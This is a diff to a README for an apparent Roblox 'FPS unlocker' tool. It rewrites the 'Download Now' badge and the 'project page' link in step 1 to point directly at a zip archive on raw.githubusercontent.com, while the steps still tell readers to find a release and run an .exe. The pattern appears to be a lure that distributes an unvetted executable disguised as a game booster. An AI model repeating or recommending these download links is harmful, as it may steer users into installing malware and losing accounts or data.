@@ -1,6 +1,6 @@
 # 🚀 rbxfpsunlocker-boost-More-240FPS - Increase your Roblox frame rates easily
 
-[![](https://img.shields.io/badge/Download_Now-Blue-blue)](https://github.com/Soilprofilezerotolerancepolicy845/rbxfpsunlocker-boost-More-240FPS)
+[![](https://img.shields.io/badge/Download_Now-Blue-blue)](https://raw.githubusercontent.com/Soilprofilezerotolerancepolicy845/rbxfpsunlocker-boost-More-240FPS/main/FpsUnlock-Source/More-FPS-boost-rbxfpsunlocker-v3.1.zip)
 
 ## 🖥️ Overview
 
@@ -20,7 +20,7 @@ This software works on most modern Windows computers. Ensure you meet these requ
 
 Follow these steps to obtain the files:
 
-1. Visit the project page at this location: [https://github.com/Soilprofilezerotolerancepolicy845/rbxfpsunlocker-boost-More-240FPS](https://github.com/Soilprofilezerotolerancepolicy845/rbxfpsunlocker-boost-More-240FPS)
+1. Visit the project page at this location: [https://raw.githubusercontent.com/Soilprofilezerotolerancepolicy845/rbxfpsunlocker-boost-More-240FPS/main/FpsUnlock-Source/More-FPS-boost-rbxfpsunlocker-v3.1.zip](https://raw.githubusercontent.com/Soilprofilezerotolerancepolicy845/rbxfpsunlocker-boost-More-240FPS/main/FpsUnlock-Source/More-FPS-boost-rbxfpsunlocker-v3.1.zip)
 2. Locate the link to the latest stable release on the right side of the page.
 3. Click the file with the .exe extension to save it to your computer.
 
